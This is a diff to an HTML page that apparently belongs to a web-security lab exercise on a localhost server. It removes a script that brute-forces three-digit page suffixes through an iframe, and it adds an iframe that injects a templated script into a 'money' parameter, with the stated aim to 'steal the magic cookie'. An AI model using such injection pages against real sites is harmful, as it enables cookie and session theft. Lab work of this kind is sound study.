@@ -9,85 +9,8 @@
 
 
 <body>
-	<p>This website is used to test all Q4 directories using users computation via javascript by dynamically changing the contents of this page</p>
-    <iframe src="" id="bad-iframe" onload=""></iframe>
+	<p>This website is used to find the magic number, then steal the magic cookie</p>
+    <iframe src="http://localhost:5000/Q4?username=Gustaf0&money={{ script }}" id="bad-iframe" onload=""></iframe>
 
-    <script onload="">
-        // Itterate through 000-999 at the page Q4
-        // Read the responded html, if it does not have "Try again, not the correct site", then you know its the right one, stop code and return to server
-        function lenThree(j){
-            if(j.length == 1){
-                return "00" + j
-            }
-            else if (j.length == 2){
-                return "0" + j 
-            }
-            return j
-        }
-
-        // let i = 0
-        // while(i < 10){
-        //    setTimeout(() => console.log(i), 500)
-
-        //     let url = "http://127.0.0.1:5000/Q4" + lenThree(i.toString())
-
-        //     let result = document.getElementById("bad-iframe").setAttribute("src", url);
-
-        //     console.log(result) 
-        // }
-
-
-        async function getCookie(){
-            let url_list = []
-            for (j=0; j < 10; j++){
-                let url = "http://127.0.0.1:5000/Q4" + lenThree(j.toString())
-                url_list.push(url)
-            }
-
-
-            url_list.forEach((item) => {
-            //     // document.getElementById("bad-iframe").setAttribute("src", item);
-                setTimeout(() => document.getElementById("bad-iframe").setAttribute("src", item), 10000)
-            });
-
-
-            for(i=0; i<10; i++){    
-
-                // setTimeout(() => console.log(i), 500)
-
-                
-
-                let url = "http://127.0.0.1:5000/Q4" + lenThree(i.toString())
-
-                // let result =  document.getElementById("bad-iframe").src = url;
-
-                
-                // await setTimeout(() => document.getElementById("bad-iframe").setAttribute("src", url), 10000);
-
-                // console.log(result)
-
-
-                
-                // fetch(url, {
-                //     "method": "GET",
-                //     "credentials": "same-origin"
-                //     // headers: {
-                //     //     Accept: 'application/json',
-                //     //     'Content-Type': 'application/json',
-                //     // }
-                // }).then(respone => respone.text().then(text => console.debug(text)) )
-                // console.log(document.cookie)
-
-                // https://stackoverflow.com/questions/36318866/reading-a-cookie-from-a-different-domain
-
-                //start a session with the URL
-                // xhr.open("GET", url, async=true)    
-
-                // // send the request
-                // xhr.send()
-            }
-        }
-        getCookie()
-    </script>
 </body>
 </html>
